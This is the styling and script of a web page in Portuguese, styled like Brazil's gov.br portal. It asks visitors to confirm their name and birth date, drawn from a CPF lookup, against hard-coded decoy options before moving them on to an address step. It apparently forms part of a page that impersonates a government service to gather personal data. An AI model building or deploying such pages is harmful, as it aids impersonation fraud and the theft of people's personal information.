    <style>
        * {
            box-sizing: border-box;
        }

        body {
            font-family: "Rawline", system-ui, sans-serif;
            margin: 0;
            background: #f0f2f5;
        }

        .top-strip {
            background: linear-gradient(90deg, #071D41 0%, #0C326F 100%);
        }

        .main-header {
            background: #1351B4;
        }

        .card {
            background: #fff;
            border-radius: 16px;
            box-shadow: 0 2px 16px rgba(0, 0, 0, 0.07);
            overflow: hidden;
        }

        .card-header {
            background: linear-gradient(135deg, #071D41 0%, #0C326F 100%);
            padding: 16px 24px;
        }

        .progress-bar {
            height: 4px;
            background: #e5e7eb;
            border-radius: 2px;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #168821, #1B873F);
            border-radius: 2px;
        }

        .footer-main {
            background: #071D41;
        }

        .option-item {
            border: 2px solid #e5e7eb;
            border-radius: 12px;
            padding: 16px;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .option-item:hover {
            border-color: #93c5fd;
            background: #f8faff;
        }

        .option-item.selected {
            border-color: #168821;
            background: #f0fdf4;
        }

        .option-item.selected .opt-number {
            background: #168821;
            color: #fff;
        }

        .opt-number {
            width: 32px;
            height: 32px;
            background: #e5e7eb;
            color: #6b7280;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            font-size: 14px;
            flex-shrink: 0;
            transition: all 0.2s;
        }

        .submit-btn {
            background: linear-gradient(135deg, #168821 0%, #1B873F 100%);
            color: #fff;
            transition: all 0.2s;
            border-radius: 50px;
        }

        .submit-btn:disabled {
            background: #d1d5db;
            color: #9ca3af;
            cursor: not-allowed;
        }

        .submit-btn:not(:disabled):hover {
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(22, 136, 33, 0.3);
        }
    </style>
    <script>
        const fakeName1 = "MARCELO HENRIQUE SILVA SOUZA";
        const fakeName2 = "LUCAS PEREIRA MENDES";
        const fakeDate1 = "1998-03-25";
        const fakeDate2 = "2002-08-17";

        let currentStep = 1;
        let nomeSelecionado = null;
        let dataSelecionada = null;
        let userData = null;

        document.addEventListener('DOMContentLoaded', function () {
            const cpfDataString = localStorage.getItem('cpfData');
            if (!cpfDataString) { window.location.href = '/inscricao'; return; }

            userData = JSON.parse(cpfDataString);
            showValidationStep(1);
            fillNameOptions();

            const submitBtn = document.getElementById('submit-button');
            submitBtn.addEventListener('click', function () {
                if (currentStep === 1) {
                    if (nomeSelecionado) {
                        if (nomeSelecionado === userData.name) {
                            showValidationStep(2);
                            fillDateOptions();
                        } else { alert("Nome incorreto! Por favor tente novamente."); resetNameSelection(); }
                    } else { alert("Selecione uma opção para prosseguir."); }
                } else if (currentStep === 2) {
                    if (dataSelecionada) {
                        if (dataSelecionada === userData.birthday) {
                            window.location.href = '/endereco' + window.location.search;
                        } else { alert("Data de nascimento incorreta! Por favor tente novamente."); resetDateSelection(); }
                    } else { alert("Selecione uma opção para prosseguir."); }
                }
            });
        });

        function fillNameOptions() {
            const options = [userData.name, fakeName1, fakeName2];
            shuffleArray(options);
            const nameOptions = document.getElementById('name-options');
            nameOptions.innerHTML = '';
            options.forEach((name, index) => {
                const option = document.createElement('div');
                option.className = 'option-item';
                option.innerHTML = `<div class="opt-number">${index + 1}</div><div class="flex-grow font-medium text-gray-700">${name.toUpperCase()}</div>`;
                option.addEventListener('click', function () { selectNameOption(this, name); });
                nameOptions.appendChild(option);
            });
        }

        function fillDateOptions() {
            const options = [userData.birthday, fakeDate1, fakeDate2];
            shuffleArray(options);
            const dateOptions = document.getElementById('date-options');
            dateOptions.innerHTML = '';
            options.forEach((date, index) => {
                const formattedDate = formatDate(date);
                const option = document.createElement('div');
                option.className = 'option-item';
                option.innerHTML = `<div class="opt-number">${index + 1}</div><div class="flex-grow font-medium text-gray-700">${formattedDate}</div>`;
                option.addEventListener('click', function () { selectDateOption(this, date); });
                dateOptions.appendChild(option);
            });
        }

        function formatDate(dateString) {
            if (!dateString) return "";
            if (dateString.includes('T')) dateString = dateString.split('T')[0];
            const parts = dateString.split('-');
            if (parts.length === 3) return `${parts[2]}/${parts[1]}/${parts[0]}`;
            return dateString;
        }

        function selectNameOption(element, name) {
            document.querySelectorAll('#name-options .option-item').forEach(opt => opt.classList.remove('selected'));
            element.classList.add('selected');
            nomeSelecionado = name;
            document.getElementById('submit-button').disabled = false;
        }

        function selectDateOption(element, date) {
            document.querySelectorAll('#date-options .option-item').forEach(opt => opt.classList.remove('selected'));
            element.classList.add('selected');
            dataSelecionada = date;
            document.getElementById('submit-button').disabled = false;
        }

        function resetNameSelection() {
            document.querySelectorAll('#name-options .option-item').forEach(opt => opt.classList.remove('selected'));
            nomeSelecionado = null;
            document.getElementById('submit-button').disabled = true;
        }

        function resetDateSelection() {
            document.querySelectorAll('#date-options .option-item').forEach(opt => opt.classList.remove('selected'));
            dataSelecionada = null;
            document.getElementById('submit-button').disabled = true;
        }

        function showValidationStep(step) {
            document.querySelectorAll('.validation-step').forEach(s => s.classList.add('hidden'));
            document.getElementById(`step-${step}`).classList.remove('hidden');
            currentStep = step;
            document.getElementById('submit-button').disabled = true;
            document.getElementById('submit-button-text').textContent = 'Prosseguir';
            // Update progress
            document.getElementById('step-label').textContent = step === 1 ? 'Confirme seu Nome' : 'Confirme sua Data';
            document.getElementById('progress').style.width = step === 1 ? '30%' : '40%';
        }

        function shuffleArray(array) {
            for (let i = array.length - 1; i > 0; i--) {
                const j = Math.floor(Math.random() * (i + 1));
                [array[i], array[j]] = [array[j], array[i]];
            }
            return array;
        }
    </script>
